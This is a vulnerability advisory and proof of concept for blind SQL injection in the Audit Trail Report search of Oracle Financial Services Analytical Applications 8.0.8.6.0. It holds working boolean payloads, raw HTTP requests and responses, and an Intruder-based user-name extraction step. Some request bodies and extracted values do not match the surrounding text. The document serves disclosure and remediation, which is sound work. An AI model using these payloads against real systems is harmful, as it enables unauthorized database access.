# Oracle Financial Services Analytical Applications - SQL Injection in Audit Trail Report

**Vendors:** Oracle ([https://www.oracle.com/](https://www.oracle.com/))
**Product:** Oracle Financial Services Analytical Applications ([https://www.oracle.com/financial-services/analytics/](https://www.oracle.com/financial-services/analytics/))
**Version:** 8.0.8.6.0
**Discovered by:** Nguyen Kim Sang, Nguyen Quoc Viet, Vy Tien Dat - HPT Vietnam Corporation

## **Description:**
Oracle Financial Services Analytical Applications Version 8.0.8.6.0 is vulnerable to SQL Injection. An authenticated attacker can exploit this vulnerability to inject malicious SQL query to extract information from databases.
*   **Vulnerable parameter**: `msgsearchfld`
*   **Function**: Reports> Audit Trail Report > Search and Filter > Search
*   **URL**: http://\[yourdomain\]/\[APIHOST\]**/rest-api/v1/audit/summary**
*   **Method**: POST
*   **Payload**:
\- True condition: `'||((SELECT CASE WHEN ((SELECT 2 FROM DUAL)='2') THEN 'd' ELSE 'X' END FROM dual))||'`
**\-** False condition: `'||((SELECT CASE WHEN ((SELECT 1 FROM DUAL)='2') THEN 'd' ELSE 'X' END FROM dual))||'`
*   **Conditional**: User Login
*   **Vulnerable / Tested Versions:**
The following version has been tested which was the most recent one when the vulnerabilities were discovered:
Oracle Financial Services Analytical Applications Version 8.0.8.6.0
## **Severity:**
7.1 / High - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
## Remediation:
**\- Input Validation and Sanitization**: Ensure all user inputs, especially in embedding functions, are strictly validated and sanitized before placing them in database queries.
**\- Use Secure Libraries**: Implement SQL query libraries or frameworks that offer built-in parameterized queries or prepared statements.
## Proof of Exploitation:
1. Login to user have granted privileges to using **Reports** and able to using Audit Trail Report function.
![](https://t3897127.p.clickup-attachments.com/t3897127/3cac5d52-a8b6-406c-99f7-28eff18443ac/image.png)
*   Reports
![](https://t3897127.p.clickup-attachments.com/t3897127/9be28f73-81bd-46c3-9efa-c668e69d8c5b/image.png)
*   Audit Trail Report
![](https://t3897127.p.clickup-attachments.com/t3897127/1cebf14a-03b6-4a37-9680-b83953178b1a/image.png)
*   Search:
![](https://t3897127.p.clickup-attachments.com/t3897127/f5b45be5-2c6e-430a-850f-b4a2dffab75c/image.png)
**1\. Input value into** Action Detail
![](https://t3897127.p.clickup-attachments.com/t3897127/0791282c-1922-44e2-9b79-59758e75d4fe/image.png)
**2\. When click on Search we can see Action Detail is msgsearchfld parameter in body of HTTP Request, we using Action Detail field value is Audit to Search, click Search and using Burp Suite to intercept the request and send to Repeater tab**
*   HTTP Request and Response when Search:
![](https://t3897127.p.clickup-attachments.com/t3897127/5e2870e8-355f-4a9e-90b1-9fbb1639f3da/image.png)
*   Result when search with Action Detail = Audit => "msgsearchfld":"Audit"
![](https://t3897127.p.clickup-attachments.com/t3897127/d839a24d-14eb-496a-b7eb-b160f9aba848/image.png)
**3\. Inject TRUE condition payload** `'||((SELECT CASE WHEN ((SELECT 2 FROM DUAL)='2') THEN 'd' ELSE 'X' END FROM dual))||'` into parameter **msgsearchfld.**
Value of parameter **msgsearchfld** when inject payload`"msgsearchfld":"Au'||((SELECT CASE WHEN ((SELECT 2 FROM DUAL)='2') THEN 'd' ELSE 'X' END FROM dual))||'it"` => **TRUE** condition => HTTP Response will return with status code 200 OK and result with payload content.
![](https://t3897127.p.clickup-attachments.com/t3897127/ec41a544-723b-4ce3-8d6a-48ca8c9e95cf/image.png)
*   Details of HTTP Request/Response **TRUE** condition:
HTTP REQUEST:

```plain
POST /<apihost>/rest-api/v1/audit/summary HTTP/1.1
Host: <yourdomain>
Content-Length: 224
Accept: */*
X-Requested-With: XMLHttpRequest
_CSRF: null, null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/json
Origin: http://<yourdomain>
Referer: http://<yourdomain>/<apihost>/reports/reports.jsp?reportType=5
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=XpgcPy2DCW_2JLXOW1wxSGVvNOsx2G9DWUBI-CygRawlyO0qARb6!1067203931
Connection: close

{"fromdate":"12-2-2024","todate":"12-31-2024","action":"All","strlocale":"en_US","msgsearchfld":"Au'||((SELECT CASE WHEN ((SELECT 2 FROM DUAL)='2') THEN 'd' ELSE 'X' END FROM dual))||'it","loggedIP":"1","gsUsrID":"FCRMUSER"}
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Tue, 31 Dec 2024 10:37:40 GMT
Content-Type: application/json
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 167464

{"payload":[{"V_ACTION_DETAILS":"Report: AUDIT TRAIL REPORT viewed","V_WORKSTATION":"1","V_USR_ID":"FCRMUSER","V_ACTION_CODE":"View","OPERATION_TIME":"2024-12-31 17:34:56","V_ACTION_SUBTYPE":"","V_STATUS":"Successful"},
}
```

4\. Inject **FALSE** condition payload `'||((SELECT CASE WHEN ((SELECT 1 FROM DUAL)='2') THEN 'd' ELSE 'X' END FROM dual))||'` to parameter msgsearchfld
**Value of of parameter** msgsearchfld **when inject payload** `"msgsearchfld":"Au'||((SELECT CASE WHEN ((SELECT 1 FROM DUAL)='2') THEN 'd' ELSE 'X' END FROM dual))||'it",` => **FALSE** condition => HTTP Response return with status code 204 No Content.
![](https://t3897127.p.clickup-attachments.com/t3897127/1faf8c32-498e-4ec3-a5b5-482d74a6ff19/image.png)
*   Details of HTTP Request/Response **FALSE** condition:
HTTP REQUEST:

```plain
POST /<apihost>/rest-api/v1/audit/summary HTTP/1.1
Host: <yourdomain>
Content-Length: 237
Accept: */*
X-Requested-With: XMLHttpRequest
_CSRF: null, null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/json
Origin: http://<yourdomain>
Referer: http://<yourdomain>/<apihost>/reports/reports.jsp?reportType=5
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=XpgcPy2DCW_2JLXOW1wxSGVvNOsx2G9DWUBI-CygRawlyO0qARb6!1067203931
Connection: close

{"fromdate":"12-2-2024","todate":"12-31-2024","action":"All","strlocale":"en_US","msgsearchfld":"Au'||(SELECT CASE WHEN ((SELECT substr(USER,1,1) FROM DUAL)='F') THEN 'd' ELSE 'X' END FROM+dual)||'it","loggedIP":"1","gsUsrID":"FCRMUSER"}


```

HTTP RESPONSE:

```plain
HTTP/1.1 204 No Content
Connection: close
Date: Tue, 31 Dec 2024 10:38:51 GMT
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7


```

5\. Inject payload `'||(SELECT CASE WHEN ((SELECT substr(USER,1,1) FROM DUAL)='F') THEN 'd' ELSE 'X' END FROM dual)||'` to extract user name from database. Using Burpsuite Intruder to exploit blind SQL Injection.
*   Result: User is **FCMRCONF**
![](https://t3897127.p.clickup-attachments.com/t3897127/955f99c2-9ec5-4926-813b-c109388aee6d/image.png)
*   Details of HTTP Request/Response **TRUE** condition when dump username data:
HTTP REQUEST:

```plain
POST /<apihost>/rest-api/v1/audit/summary HTTP/1.1
Host: <yourdomain>
Content-Length: 237
Accept: */*
X-Requested-With: XMLHttpRequest
_CSRF: null, null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/json
Origin: http://<yourdomain>
Referer: http://<yourdomain>/<apihost>/reports/reports.jsp?reportType=5
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=XpgcPy2DCW_2JLXOW1wxSGVvNOsx2G9DWUBI-CygRawlyO0qARb6!1067203931
Connection: close


{"fromdate":"12-2-2024","todate":"12-31-2024","action":"All","strlocale":"en_US","msgsearchfld":"Au'||(SELECT CASE WHEN ((SELECT substr(USER,1,1) FROM DUAL)='F') THEN 'd' ELSE 'X' END FROM dual)||'it","loggedIP":"1","gsUsrID":"FCRMUSER"}


```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Tue, 31 Dec 2024 10:39:07 GMT
Content-Type: application/json
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 167671

{"payload":[{"V_ACTION_DETAILS":"Report: AUDIT TRAIL REPORT viewed","V_WORKSTATION":"1","V_USR_ID":"FCRMUSER","V_ACTION_CODE":"View","OPERATION_TIME":"2024-12-31 17:34:56","V_ACTION_SUBTYPE":"","V_STATUS":"Successful"},
}
```

*   Details of HTTP Request/Response **FALSE** condition when dump username data:
HTTP REQUEST:

```plain
POST /<apihost>/rest-api/v1/audit/summary HTTP/1.1
Host: <yourdomain>
Content-Length: 237
Accept: */*
X-Requested-With: XMLHttpRequest
_CSRF: null, null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/json
Origin: http://<yourdomain>
Referer: http://<yourdomain>/<apihost>/reports/reports.jsp?reportType=5
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=XpgcPy2DCW_2JLXOW1wxSGVvNOsx2G9DWUBI-CygRawlyO0qARb6!1067203931
Connection: close

{"fromdate":"12-2-2024","todate":"12-31-2024","action":"All","strlocale":"en_US","msgsearchfld":"Au'||(SELECT CASE WHEN ((SELECT substr(USER,1,1) FROM DUAL)='A') THEN 'd' ELSE 'X' END FROM dual)||'it","loggedIP":"1","gsUsrID":"FCRMUSER"}


```

HTTP RESPONSE:

```plain
HTTP/1.1 204 No Content
Connection: close
Date: Tue, 31 Dec 2024 10:39:28 GMT
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7


```